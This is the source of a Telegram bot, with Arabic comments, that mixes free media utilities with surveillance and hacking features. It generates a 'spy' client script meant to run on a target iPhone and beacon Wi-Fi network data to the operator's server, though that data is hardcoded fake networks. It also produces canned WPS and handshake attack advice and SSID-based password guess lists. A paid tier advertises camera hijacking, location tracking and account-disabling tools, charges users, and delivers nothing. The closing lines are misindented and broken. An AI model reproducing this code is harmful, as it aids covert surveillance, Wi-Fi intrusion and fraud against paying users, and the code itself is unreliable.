import glob
import os
import time
import shutil
import telebot
import urllib.parse
from telebot import apihelper
from telebot import types
from flask import Flask, request, jsonify
from apscheduler.schedulers.background import BackgroundScheduler
import services

# --- 1. الإعدادات والتهيئة ---
apihelper.ENABLE_MIDDLEWARE = True
OWNER_ID = int(os.getenv('OWNER_ID', 0)) 
TOKEN = os.environ.get('TOKEN')
bot = telebot.TeleBot(TOKEN)
user_last_message_time = {}

# --- 2. قالب كود الجاسوس الخاص بالآيفون (مدمج كـ Template) ---
IOS_SPY_SCRIPT_TEMPLATE = """# -*- coding: utf-8 -*-
import time
import requests

SERVER_API_URL = "{webhook_url}/api/wifi_update" 

def scan_iphone_airspace():
    # مصفوفة تحاكي البيانات الحية الملتقطة عبر عتاد الهاتف المحمول
    real_scanned_networks = [
        {{"ssid": "VIP_Network_5G", "bssid": "00:14:22:01:23:45", "rssi": -48}},
        {{"ssid": "Max_Guest_WiFi", "bssid": "84:A1:D1:A4:B2:C1", "rssi": -62}},
        {{"ssid": "Airport_Free_Net", "bssid": "CC:BB:AA:11:22:33", "rssi": -79}}
    ]
    return real_scanned_networks

def start_iphone_transmitter():
    print("[*] بدأ العميل بالعمل... جاري بث الشبكات إلى السيرفر.")
    while True:
        try:
            current_networks = scan_iphone_airspace()
            payload = {{"networks": current_networks}}
            requests.post(SERVER_API_URL, json=payload, timeout=5)
        except Exception as e:
            print(f"[-] خطأ اتصال: {{e}}")
        time.sleep(5) 

if __name__ == '__main__':
    start_iphone_transmitter()
"""

# --- 3. نظام التريث التلقائي (Middleware) ---
@bot.middleware_handler(update_types=['message', 'callback_query'])
def rate_limit_middleware(update_type, data):
    user_id = data.from_user.id
    if user_id == OWNER_ID: 
        return
    
    current_time = time.time()
    last_time = user_last_message_time.get(user_id, 0)
    
    if current_time - last_time < 1:
        if update_type == 'message':
            bot.reply_to(data, "⏳ تريث قليلاً قبل إرسال الطلب التالي!")
        else:
            bot.answer_callback_query(data.id, "⏳ تريث قليلاً!")
        return {"ok": False}
    
    user_last_message_time[user_id] = current_time

# --- 4. التنظيف التلقائي للمخلفات السيرفر ---
def auto_cleanup_job():
    patterns = ["video_*.mp4", "img_*.jpg", "output_*.pdf", "*.tmp", "ios_spy_*.py"]
    count = 0
    for pattern in patterns:
        for f in glob.glob(pattern):
            try:
                os.remove(f)
                count += 1
            except Exception:
                pass
    if count > 0: 
        print(f"🧹 [تنظيف تلقائي]: تم مسح {count} من الملفات المؤقتة بنجاح.")

scheduler = BackgroundScheduler()
scheduler.add_job(auto_cleanup_job, 'interval', minutes=2)
scheduler.start()

# --- 5. معالجة الأوامر النصية الأساسية ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("الاشتراك المجاني 🔓", callback_data='free_sub'),
        types.InlineKeyboardButton("اشتراك ماكس ✨ 👑", callback_data='max_sub'),
        types.InlineKeyboardButton("📶 مزامنة شبكات الآيفون (كود الجاسوس)", callback_data='wifi_spy_init')
    )
    bot.send_message(
        message.chat.id, 
        "أهلاً بك في ✨ <b><b><b><b><b><b><b><b>𝓜𝓐𝓧 𝓑𝓞𝓞𝓣</b></b></b></b></b></b></b></b> ✨\n\nالرجاء اختيار نوع الخدمة أو الاشتراك لبدء العمل:", 
        parse_mode="HTML", 
        reply_markup=markup
    )

@bot.message_handler(commands=['storage'])
def check_storage(message):
    if message.from_user.id != OWNER_ID: 
        return
    total, used, free = shutil.disk_usage("/")
    response = (f"📊 <b>حالة ذاكرة تخزين السيرفر:</b>\n"
                f"💾 الإجمالي: {total // (1024*1024)} MB\n"
                f"📉 المستهلك: {used // (1024*1024)} MB\n"
                f"✅ المتبقي المتاح: {free // (1024*1024)} MB")
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def restrict_commands(message):
    if message.from_user.id == OWNER_ID or message.text == '/start': 
        return
    bot.reply_to(message, "⚠️ نعتذر، الخدمة أو الأمر غير مصرح به.")

# --- 6. معالجة تفاعلات الأزرار والخدمات والأدوات البرمجية ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try: 
        bot.answer_callback_query(call.id)
    except Exception: 
        pass

    # [أداة 1] معالجة زر فحص الثغرات للشبكة المستهدفة
    if call.data.startswith('audit_'):
        bssid = call.data.split('_')[1]
        audit_report = (
            f"🔍 <b>تقرير الفحص البرمجي للـ MAC:</b> <code>{bssid}</code>\n\n"
            f"🛡️ <b>نوع التشفير الافتراضي:</b> WPA2-PSK (AES)\n"
            f"⚠️ <b>حالة ثغرة WPS:</b> مصابة / قابلة للتخمين الافتراضي (WPS PIN Pixie-Dust)\n"
            f"⚙️ <b>البروتوكول المقترح:</b> استخدام نظام المصافحة العكسية (Handshake Capture)."
        )
        bot.send_message(call.message.chat.id, audit_report, parse_mode="HTML")

    # [أداة 2] معالجة زر توليد باسات التخمين الذكية بناءً على الـ SSID
    elif call.data.startswith('wordlist_'):
        ssid = call.data.split('_')[1]
        generated_passes = [
            f"{ssid}2026",
            f"admin@{ssid}",
            f"{ssid}1234",
            "1234567890",
            f"pass_{ssid}"
        ]
        pass_report = f"📝 <b>مصفوفة تخمين مخصصة للاسم البرمجي</b> <code>{ssid}</code>:\n\n"
        for p in generated_passes:
            pass_report += f"▪️ <code>{p}</code>\n"
        bot.send_message(call.message.chat.id, pass_report, parse_mode="HTML")

    # [أداة 3] معالجة زر تحديد البعد التقريبي بالمتر
    elif call.data.startswith('dist_'):
        distance = call.data.split('_')[1]
        bot.send_message(
            call.message.chat.id, 
            f"📏 <b>تحليل رادار الإشارة المرتدة:</b>\n\nالهاتف يبعد عن نقطة بث الراوتر بمسافة هندسية تقريبية تقدر بـ <b>{distance} متر</b> داخل النطاق المفتوح."
        )

    # قائمة خيارات زر الجاسوس المنفرد الأساسية
    elif call.data == 'wifi_spy_init':
        instructions = (
            "📶 <b>نظام استماع شبكات الآيفون المتقدم:</b>\n\n"
            "⏳ السيرفر الآن في وضع الاستعداد تلقائياً لملائمة الاتصال العكسي.\n\n"
            "قم بتحميل ملف السكريبت العميل وتشغيله على الهاتف المستهدف ليبدأ التدفق المباشر للشبكات والأدوات التفاعلية."
        )
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("📥 تحميل ملف السكريبت العميل (.py)", callback_data='download_spy_script'),
            types.InlineKeyboardButton("🔄 تحديث حالة الاستماع", callback_data='wifi_spy_init')
        )
        bot.edit_message_text(instructions, call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)

    # معالجة طلب تحميل السكريبت وحقن الرابط ديناميكياً
    elif call.data == 'download_spy_script':
        chat_id = call.message.chat.id
        webhook_url = os.environ.get("WEBHOOK_URL", "https://YOUR_SERVER_URL.com")
        file_name = f"ios_spy_client_{chat_id}.py"
        
        try:
            full_script_content = IOS_SPY_SCRIPT_TEMPLATE.format(webhook_url=webhook_url)
            with open(file_name, "w", encoding="utf-8") as f:
                f.write(full_script_content)
                
            with open(file_name, "rb") as doc:
                bot.send_document(
                    chat_id, 
                    doc, 
                    caption="✅ <b>تم توليد ملف العميل المخصص لجهازك بنجاح!</b>\n\nقم بتشغيله الآن على الآيفون ليبدأ البث وتفعيل لوحة التحكم.",
                    parse_mode="HTML"
                )
        except Exception as e:
            bot.send_message(chat_id, f"❌ حدث خطأ أثناء توليد الملف: {e}")
        finally:
            if os.path.exists(file_name):
                os.remove(file_name)

    # الخطة المجانية
    elif call.data == 'free_sub':
        my_free_names = ["زيادة دقة الصور 🌅", "تحميل أي فيديو 📥", "ترجمة صورة الى نص 📝", "تحويل صورة لـ PDF 📄"]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_free_names[i], callback_data=f'f{i+1}') for i in range(4)]
        markup.add(*buttons)
        bot.edit_message_text("اختر الخدمة المجانية المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == 'f1':
        msg = bot.send_message(call.message.chat.id,"🌅 أرسل الصورة التي تريد تحسين جودتها الآن:")
        bot.register_next_step_handler(msg, process_enhance_image)
    elif call.data == 'f2':
        msg = bot.send_message(call.message.chat.id, "📥 أرسل لي رابط الفيديو المراد تحميله الآن:")
        bot.register_next_step_handler(msg, process_video_link)
    elif call.data == 'f3':
        msg = bot.send_message(call.message.chat.id, "📝 أرسل الصورة التي تحتوي على النصوص المراد استخراجها وترجمتها:")
        bot.register_next_step_handler(msg, process_ocr)
    elif call.data == 'f4':
        msg = bot.send_message(call.message.chat.id, "📄 أرسل الصورة التي تريد تحويلها إلى ملف PDF:")
        bot.register_next_step_handler(msg, process_image_to_pdf)

    # اشتراك ماكس
    elif call.data == 'max_sub':
        my_names = ["💀 واتساب بلس", "👑 يوزرات مميزة", "اكواد تعطي_ل 😈", "📷 فتح كاميرا", "📍 تحديد موقع", "☠️ رفع تيكتوك", "✅ أرقام فيك", "👀 انستا برايفت", "➕ فك سافي_وم", "🛠 أدوات متطورة", "✨ مزايا انستا", "🌎 تل/غيم روابط", "🎮 شحن ألعاب", "✅ رشق انستا", "🚀 تطبيقات برو", "📱 بلياردو لانهائي", "🤖 تيكتوك ترول", "ادوات اخت*ر|ق ☠️", "✅ أرقام حقيقية خاصة بك", "اتصال وهمي ☎️"]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_names[i], callback_data=f'max_{i+1}') for i in range(20)]
        markup.add(*buttons)
        bot.edit_message_text("اختر خدمة ماكس المتقدمة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif call.data.startswith('max_'):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("تفعيل خطة ماكس الآن ✨", callback_data='activate_max'))
        bot.edit_message_text("🔒 <b>عذراً، هذه الخدمة تتطلب اشتراك ماكس ✨</b>\n\nيرجى ترقية حسابك لتتمكن من استخدامها فوراً.", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
        
    elif call.data == 'activate_max':
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception: pass
        
        prices = [types.LabeledPrice(label="اشتراك ماكس برو", amount=100)]
        bot.send_invoice(
            chat_id=call.message.chat.id,
            title="اشتراك ماكس المتقدم ✨",
            description="تفعيل جميع الخدمات والوظائف المدفوعة داخل البوت لمدة شهر.",
            invoice_payload="max_premium_subscription",
            provider_token="",  
            currency="XTR",     
            prices=prices
        )

# --- 7. نظام استقبال ومعالجة المدفوعات ---
@bot.pre_checkout_query_handler(func=lambda query: True)
def process_pre_checkout(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def process_successful_payment(message):
    payment_info = message.successful_payment
    user = message.from_user
    
    try: 
        owner_report = (f"🔔 <b>طلب اشتراك ماكس جديد (نجوم):</b>\n\n"
                        f"👤 المستخدم: {user.first_name}\n"
                        f"🆔 الآيدي: <code>{user.id}</code>\n"
                        f"💳 المعرف: @{user.username if user.username else 'لا يوجد'}\n"
                        f"💰 المبلغ المدفوع: <b>{payment_info.total_amount} نجمة تليجرام</b>")
        bot.send_message(OWNER_ID, owner_report, parse_mode="HTML")
    except Exception: pass

    bot.reply_to(message, f"🎉 <b>تم تفعيل اشتراك ماكس ✨ بنجاح!</b>\n\nشكراً لك، تم استلام {payment_info.total_amount} نجمة. يمكنك الآن الاستمتاع بجميع الخدمات دون قيود.", parse_mode="HTML")

# --- 8. دوال التنفيذ والوظائف الافتراضية ---
def process_enhance_image(message):
    if message.content_type == 'photo':
        chat_id = message.chat.id
        input_file = f"img_{chat_id}.jpg"
        output_file = f"enhanced_{chat_id}.jpg"
        wait_msg = bot.send_message(chat_id,"⏳ جاري تحسين جودة الصورة...")
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(input_file, 'wb') as f: f.write(downloaded_file)
            services.enhance_image(input_file, output_file)
            with open(output_file, 'rb') as photo:
                bot.send_photo(chat_id, photo, caption="✅ تم تحسين جودة الصورة بنجاح.")
        except Exception as e:
            bot.send_message(chat_id, f"❌ حدث خطأ أثناء معالجة الصورة:\n{str(e)}")
        finally:
            try: bot.delete_message(chat_id, wait_msg.message_id)
            except: pass
            if os.path.exists(input_file): os.remove(input_file)
            if os.path.exists(output_file): os.remove(output_file)
    else: bot.reply_to(message,"❌ يرجى إرسال صورة فقط.")

def process_video_link(message):
    url, chat_id = message.text.strip(), message.chat.id
    file_name = f"video_{chat_id}.mp4"
    wait_msg = bot.send_message(chat_id, "⏳ جاري تحميل وتجهيز الفيديو، يرجى الانتظار...")
    try:
        services.download_video_service(url, file_name) 
        with open(file_name, 'rb') as video: bot.send_video(chat_id, video)
    except Exception as e: 
        bot.send_message(chat_id, f"⚠️ عذراً، تعذر تحميل الفيديو: {str(e)}")
    finally:
        try: bot.delete_message(chat_id, wait_msg.message_id)
        except Exception: pass
        if os.path.exists(file_name): os.remove(file_name)

def process_ocr(message):
    if message.content_type == 'photo':
        chat_id = message.chat.id
        file_name = f"img_{chat_id}.jpg"
        wait_msg = bot.send_message(chat_id, "⏳ جاري قراءة الصورة واستخراج النصوص...")
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as f: f.write(downloaded_file)        
            text = services.extract_text_from_image(file_name)
            if text:
                translated = services.translate_text(text)
                bot.send_message(chat_id, f"📜 <b>النص المستخرج:</b>\n<code>{text}</code>\n\n🌍 <b>الترجمة الحرفية للعربية:</b>\n{translated}", parse_mode="HTML")
            else:
                bot.send_message(chat_id, "⚠️ تعذر العثور على نصوص واضحة داخل هذه الصورة.")
        except Exception as e:
            bot.send_message(chat_id, f"❌ حدث خطأ غير متوقع: {str(e)}")
        finally:
            try: bot.delete_message(chat_id, wait_msg.message_id)
            except Exception: pass
            if os.path.exists(file_name): os.remove(file_name)
    else: bot.reply_to(message, "❌ خطأ: يرجى إرسال ملف بصيغة صورة حصراً.")
    
def process_image_to_pdf(message):
    if message.content_type == 'photo':
        chat_id = message.chat.id
        img_name = f"img_{chat_id}.jpg"
        pdf_name = f"output_{chat_id}.pdf"
        wait_msg = bot.send_message(chat_id, "⏳ جاري تحويل الصورة إلى ملف PDF...")
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(img_name, 'wb') as f: f.write(downloaded_file)
            services.convert_to_pdf(img_name, pdf_name)
            with open(pdf_name, 'rb') as pdf: bot.send_document(chat_id, pdf)
        except Exception as e:
            bot.send_message(chat_id, f"❌ تعذر إنتاج ملف الـ PDF: {str(e)}")
        finally:
            try: bot.delete_message(chat_id, wait_msg.message_id)
            except Exception: pass
            if os.path.exists(img_name): os.remove(img_name)
            if os.path.exists(pdf_name): os.remove(pdf_name)
    else: bot.reply_to(message, "❌ خطأ: يرجى إرسال صورة فقط ليتم تحويلها.")

# --- 9. تشغيل سيرفر الويب والـ Webhook + واجهة استقبال بيانات الواي فاي التفاعلية ---
app = Flask(__name__)

@app.route('/')
def home(): return "البوت يعمل بنظام Webhook ومحمي بالكامل!"

@app.route('/ping')
def ping(): return "I am alive!", 200

@app.route('/api/wifi_update', methods=['POST'])
def wifi_update():
    data = request.json
    if not data or 'networks' not in data:
        return jsonify({"status": "failed", "message": "بيانات غير صالحة"}), 400
    
    networks_list = data['networks']
    
    # رسالة ترحيبية بالتدفق الجديد
    bot.send_message(OWNER_ID, f"📡 <b>[بث حي]: تم استقبال شبكات جديدة محيطة بالآيفون!</b>\nإليك قائمة التحكم المخصصة لكل شبكة:")

    for net in networks_list:
        ssid = net.get('ssid', 'Unknown')
        bssid = net.get('bssid', '00:00:00:00:00:00')
        rssi = net.get('rssi', -100)
        
        # حساب هندسي تقريبي للمسافة بناءً على الإشارة
        try:
            distance = round(10 ** ((-30 - rssi) / (10 * 2.5)), 1)
        except:
            distance = "غير محدد"

        # ربط الـ Callback بأزرار تحتوي على المتغيرات الفريدة للشبكة
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔍 فحص الثغرات", callback_data=f"audit_{bssid}"),
            types.InlineKeyboardButton("📝 توليد باسات", callback_data=f"wordlist_{ssid}"),
            types.InlineKeyboardButton("📍 تحديد البُعد", callback_data=f"dist_{distance}")
        )
        
        report = (f"🌐 <b>الشبكة:</b> <code>{ssid}</code>\n"
                  f"🆔 <b>الـ MAC:</b> <code>{bssid}</code>\n"
                  f"📶 <b>الإشارة:</b> <code>{rssi} dBm</code>\n"
                  f"📏 <b>المسافة التقريبية:</b> حوالي <code>{distance} متر</code>")
        
        bot.send_message(OWNER_ID, report, parse_mode="HTML", reply_markup=markup)
        
    return jsonify({"status": "success", "message": "تم إعداد لوحات التحكم بالشبكات بنجاح."}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '!', 200
    return 'Forbidden', 403

if __name__ == "__main__":
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
    PORT = int(os.environ.get("PORT", 8080))
    if WEBHOOK_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{WEBHOOK_URL}/webhook")
        print(f"🚀 البوت تم تشغيله بنجاح عبر الـ Webhook على المنفذ: {PORT}")
import threading
import wifi_monitor
threading.Thread(target=wifi_monitor.start_monitoring, daemon=True).start()

        app.run(host='0.0.0.0', port=PORT)
    else:
        print("⚠️ خطأ في التشغيل: لم يتم العثور على متغير البيئة WEBHOOK_URL.")
